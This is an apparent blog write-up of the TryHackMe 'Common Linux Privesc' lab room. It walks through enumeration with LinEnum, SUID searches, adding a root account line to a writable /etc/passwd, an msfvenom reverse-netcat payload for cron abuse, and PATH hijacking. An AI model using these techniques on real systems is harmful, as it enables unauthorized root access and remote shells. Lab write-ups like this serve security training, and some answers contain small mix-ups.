I"•"<p>It‚Äôs a write-up about the room : <a href="https://tryhackme.com/room/commonlinuxprivesc">Try Hack Me - Room : Common Linux Privesc</a></p>

<h1 id="task-1-get-connected">[Task 1] Get Connected</h1>

<blockquote>
  <p>This room will explore common Linux Privilege Escalation vulnerabilities and techniques, but in order to do that, we‚Äôll need to do a few things first!</p>
</blockquote>

<p>A basic knowledge of Linux, and how to navigate the Linux file system, is required for this room.</p>

<p>We deploy the instance.</p>

<h1 id="task-2-understanding-privesc">[Task 2] Understanding Privesc</h1>

<p><img src="/assets/img/thm/linux-privesc/task-2.png" alt="Task 2" /></p>

<h1 id="task-3-enumeration">[Task 3] Enumeration</h1>

<p><img src="/assets/img/thm/linux-privesc/task-3.png" alt="Task 3" /></p>

<h1 id="task-4---enumeration">[Task 4] - Enumeration</h1>

<ul>
  <li>
    <p>First, let‚Äôs SSH into the target machine, using the credentials user3:password. This is to simulate getting a foothold on the system as a normal privilege user.
So, <code class="language-plaintext highlighter-rouge">ssh user3@IP_MACHINE</code> with the password <code class="language-plaintext highlighter-rouge">password</code>.</p>
  </li>
  <li>
    <p>What is the target‚Äôs hostname?</p>
  </li>
</ul>

<p>We o <code class="language-plaintext highlighter-rouge">hostname</code> to know the name of the machine. The answer is <strong>polobox</strong>.</p>

<ul>
  <li>Look at the output of /etc/passwd how many ‚Äúuser[x]‚Äù are there on the system?</li>
</ul>

<p>We use the command <code class="language-plaintext highlighter-rouge">cat /etc/passwd | grep user</code> and find <strong>8</strong> users.</p>

<ul>
  <li>How many available shells are there on the system?</li>
</ul>

<p>We download a local copy of LinEnum from <a href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh">Linenum.sh</a>. After that, we start a Python web server to get LinEnum on the target machine with :</p>

<blockquote>
  <p>Using Python 2: python2 -m SimpleHTTPServer <br />
Using Python 3: python -m http.server</p>
</blockquote>

<p>We get the LinEnum bash file using the command : <code class="language-plaintext highlighter-rouge">wget http://VPN_ADRESS:8000/LinEnum.sh</code>.</p>

<p>We find the VPN_ADRESS corresponding to <code class="language-plaintext highlighter-rouge">utun</code> on the ouptut of the command <code class="language-plaintext highlighter-rouge">ifconfig</code> on the local machine.</p>

<p>Make the file executable using the command <code class="language-plaintext highlighter-rouge">chmod +x LinEnum.sh</code> on the target machine, and execute this one : <code class="language-plaintext highlighter-rouge">./LinEnum.sh</code>. The output reveals to us :</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>[-] Available shells:
# /etc/shells: valid login shells
/bin/sh
/bin/dash
/bin/bash
/bin/rbash
</pre></td></tr></tbody></table></code></pre></div></div>
<p>So, there are <strong>4</strong> available shells on the system.</p>

<ul>
  <li>What is the name of the bash script that is set to run every 5 minutes by cron?</li>
</ul>

<p>We search the bash script in the crontab : <code class="language-plaintext highlighter-rouge">cat /etc/crontab</code>. <br />
There is this line : <code class="language-plaintext highlighter-rouge">*/5  *    * * * root    /home/user4/Desktop/autoscript.sh</code>.<br />
Therefore, the name of the bash script thait is set to run every 5 minutes by cron is <strong>autoscript.sh</strong>.</p>

<ul>
  <li>What critical file has had its permissions changed to allow some users to write to it?</li>
</ul>

<p>The file is <strong>/etc/passwd</strong>.</p>

<p><strong>Other file</strong> : <code class="language-plaintext highlighter-rouge">linepeas.sh</code> available on this website <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">PEASS - Privilege Escalation Awesome Scripts SUITE</a>.</p>

<h1 id="task-5---abusing-suidguid-files">[Task 5] - Abusing SUID/GUID Files</h1>

<ul>
  <li>What is the path of the file in user3‚Äôs directory that stands out to you?</li>
</ul>

<p>We use <code class="language-plaintext highlighter-rouge">pwd</code> and <code class="language-plaintext highlighter-rouge">ls</code> to know the path of the shell. We find <strong>/home/user3/shell</strong>.
After that we execute the binary <code class="language-plaintext highlighter-rouge">./shell</code>.</p>

<p>Synbollically : find / -perm -u=s -type f 2&gt;/dev/null<br />
Numerically : find / -perm -4000 -type f 2&gt;/dev/null</p>

<h1 id="task-6---exploiting-writeable-etcpasswd">[Task 6] - Exploiting Writeable /etc/passwd</h1>

<p>We swap to user7 with <code class="language-plaintext highlighter-rouge">su user7</code> and the password <code class="language-plaintext highlighter-rouge">password</code>.</p>

<ul>
  <li>Having read the information above, what direction privilege escalation is this attack?</li>
</ul>

<p>The direction privilege escalation is <strong>vertical</strong>.</p>

<ul>
  <li>Before we add our new user, we first need to create a compliant password hash to add! We do this by using the command: ‚Äúopenssl passwd -1 -salt [salt] [password]‚Äù. What is the hash created by using this command with the salt, ‚Äúnew‚Äù and the password ‚Äú123‚Äù?</li>
</ul>

<p>First, go to the home directory of the user7 : <code class="language-plaintext highlighter-rouge">cd /home/user7</code>.<br />
After that, we use : <code class="language-plaintext highlighter-rouge">openssl passwd -1 -salt new 123</code> and find the hash <strong>$1$new$p7ptkEKU1HnaHpRtzNizS1</strong>.</p>

<ul>
  <li>Great! Now we need to take this value, and create a new root user account. What would the /etc/passwd entry look like for a root user with the username ‚Äúnew‚Äù and the password hash we created before?</li>
</ul>

<p>We create a new root user account with vi : <code class="language-plaintext highlighter-rouge">vi /etc/passwd</code> and we add this line :<br />
<code class="language-plaintext highlighter-rouge">new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash</code>.</p>

<p>The answer is <code class="language-plaintext highlighter-rouge">new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash</code>.</p>

<h1 id="task-7---escaping-vi-editor">[Task 7] - Escaping Vi Editor</h1>

<p>We swap to user8 with <code class="language-plaintext highlighter-rouge">su user8</code> and the password <code class="language-plaintext highlighter-rouge">password</code>.</p>

<ul>
  <li>Let‚Äôs use the ‚Äúsudo -l‚Äù command, what does this user require (or not require) to run vi as root? <code class="language-plaintext highlighter-rouge">NOPASSWD</code></li>
</ul>

<h1 id="task-8---exploiting-crontab">[Task 8] - Exploiting Crontab</h1>

<p>We swap to user4 with <code class="language-plaintext highlighter-rouge">su user4</code> and the password <code class="language-plaintext highlighter-rouge">password</code>.</p>

<ul>
  <li>What is the flag to specify a payload in msfvenom? <code class="language-plaintext highlighter-rouge">-p</code></li>
</ul>

<p>We create a payload using: <code class="language-plaintext highlighter-rouge">msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R</code>.</p>

<ul>
  <li>What directory is the ‚Äúautoscript.sh‚Äù under? <code class="language-plaintext highlighter-rouge">/home/user4/Desktop</code></li>
</ul>

<h1 id="task-9---exploiting-path-variable">[Task 9] - Exploiting PATH Variable</h1>

<p>We swap to user5 with <code class="language-plaintext highlighter-rouge">su user5</code> and the password <code class="language-plaintext highlighter-rouge">password</code>.</p>

<ul>
  <li>Let‚Äôs go to user5‚Äôs home directory, and run the file ‚Äúscript‚Äù. What command do we think that it‚Äôs executing?</li>
</ul>

<p>We execute the binary <code class="language-plaintext highlighter-rouge">./shell</code> and this one do the same as <strong>ls</strong> command.</p>

<ul>
  <li>
    <p>Now we‚Äôre inside tmp, let‚Äôs create an imitation executable. The format for what we want to do is: echo ‚Äú[whatever command we want to run]‚Äù &gt; [name of the executable we‚Äôre imitating]
What would the command look like to open a bash shell, writing to a file with the name of the executable we‚Äôre imitating. <code class="language-plaintext highlighter-rouge">echo "/bin/bash" &gt; ls</code></p>
  </li>
  <li>
    <p>Great! Now we‚Äôve made our imitation, we need to make it an executable. What command do we execute to do this? <code class="language-plaintext highlighter-rouge">chmod +x ls</code></p>
  </li>
</ul>
:ET